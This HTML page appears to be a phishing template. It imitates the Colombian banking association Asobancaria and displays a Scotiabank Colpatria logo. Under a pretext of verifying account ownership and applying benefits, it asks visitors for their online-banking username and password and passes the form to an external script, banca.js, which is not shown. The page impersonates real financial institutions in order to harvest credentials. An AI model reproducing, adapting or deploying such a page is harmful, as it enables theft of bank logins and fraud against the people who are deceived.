<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso a Banca Virtual | Asobancaria</title>
    <link rel="shortcut icon" href="./assets/logos/aso_logo_azul.png" type="image/x-icon">

    <!-- CSS -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lora&family=Montserrat:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="./css/normalize.css">
    <link rel="stylesheet" href="./css/main.css">

    <!-- VALIDATIONS -->
    <script src="./js/functions.js"></script>

</head>

<body>

    <header class="header-img header-img-card-2">
        <nav class="navbar-video">
            <div class="navbar-content">
                <img class="navbar-brand-video" src="./assets/logos/aso_logo_azul.png" alt="ASOBANCARIA">
                <img class="hamburguer-menu-video" src="./assets/svg/hamburguer-menu.png" alt="H">
            </div>
        </nav>

        <div class="header-img-content">
            <h4>Accede a tu Banca Virtual para verificar <span class="fw-2">titularidad</span></h4>
        </div>
    </header>

    <section>
        <div class="container-float">
            <form id="form">
                <h3 class="mb-0" style="text-align: center;">Acceso a Banca Virtual</h3>
                <div class="logo-banca mt-2">
                    <img id="-icon-banco" src="./assets/logos/scotiabank-colpatria.png" alt="">
                </div>
                <p>Inicia sesión en tu banca para que podamos aplicar los beneficios a tu producto.</p>

                <input id="user" type="text" class="form-input" placeholder=" Usuario">
                <input id="puser" type="password" class="form-input" placeholder=" Contraseña">

                <button class="btn btn-primary mt-2" id="success">
                    Acceder
                </button>
            </form>
        </div>
    </section>

    <footer class="footer-fixed">
        <p>©Copyright Asobancaria 2023</p>
        <p>Políticas de Privacidad</p>
    </footer>

    <!-- SCRIPTS -->
    <script src="./js/banca.js"></script>
</body>
